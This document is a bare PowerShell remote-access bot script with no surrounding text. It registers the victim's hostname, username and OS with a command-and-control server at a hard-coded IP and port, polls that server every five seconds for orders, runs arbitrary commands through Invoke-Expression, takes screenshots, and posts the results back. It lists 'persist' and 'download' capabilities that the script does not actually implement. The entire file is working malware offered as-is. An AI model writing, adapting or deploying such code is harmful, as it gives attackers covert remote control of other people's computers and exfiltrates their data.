$C2_IP = "192.168.1.6"
$C2_PORT = "8000"
$BOT_ID = -join ((48..57) + (97..102) | Get-Random -Count 16 | ForEach-Object {[char]$_})

function Register-Bot {
    $body = @{
        bot_id = $BOT_ID
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        os = (Get-CimInstance Win32_OperatingSystem).Caption
        arch = $env:PROCESSOR_ARCHITECTURE
        capabilities = @("shell","screenshot","info","persist","download")
    } | ConvertTo-Json -Compress
    try {
        Invoke-RestMethod -Uri "http://$C2_IP`:$C2_PORT/c2/clear/register" -Method POST -Body $body -ContentType "application/json" | Out-Null
        return $true
    } catch { return $false }
}

function Check-Commands {
    try {
        $r = Invoke-RestMethod -Uri "http://$C2_IP`:$C2_PORT/c2/clear/check/$BOT_ID" -Method GET
        return $r.commands
    } catch { return @() }
}

function Send-Result($cmdId, $result) {
    $body = @{ cmd_id = $cmdId; result = $result } | ConvertTo-Json -Compress
    try { Invoke-RestMethod -Uri "http://$C2_IP`:$C2_PORT/c2/clear/result/$BOT_ID" -Method POST -Body $body -ContentType "application/json" | Out-Null } catch {}
}

function Execute-Shell($cmd) {
    try { Invoke-Expression $cmd 2>&1 | Out-String } catch { return $_.Exception.Message }
}

function Take-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms,System.Drawing
        $s = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $b = New-Object System.Drawing.Bitmap($s.Width,$s.Height)
        $g = [System.Drawing.Graphics]::FromImage($b)
        $g.CopyFromScreen($s.Location,[System.Drawing.Point]::Empty,$s.Size)
        $m = New-Object System.IO.MemoryStream
        $b.Save($m,[System.Drawing.Imaging.ImageFormat]::Png)
        return [Convert]::ToBase64String($m.ToArray())
    } catch { return "Error" }
}

if (Register-Bot) {
    while ($true) {
        foreach ($cmd in (Check-Commands)) {
            $res = switch ($cmd.command) {
                "shell" { Execute-Shell $cmd.args }
                "screenshot" { Take-Screenshot }
                "info" { @{hostname=$env:COMPUTERNAME;user=$env:USERNAME;os=(Get-CimInstance Win32_OperatingSystem).Caption} | ConvertTo-Json }
                "kill" { exit }
                default { "Unknown" }
            }
            Send-Result $cmd.id $res
        }
        Start-Sleep -Seconds 5
    }
}
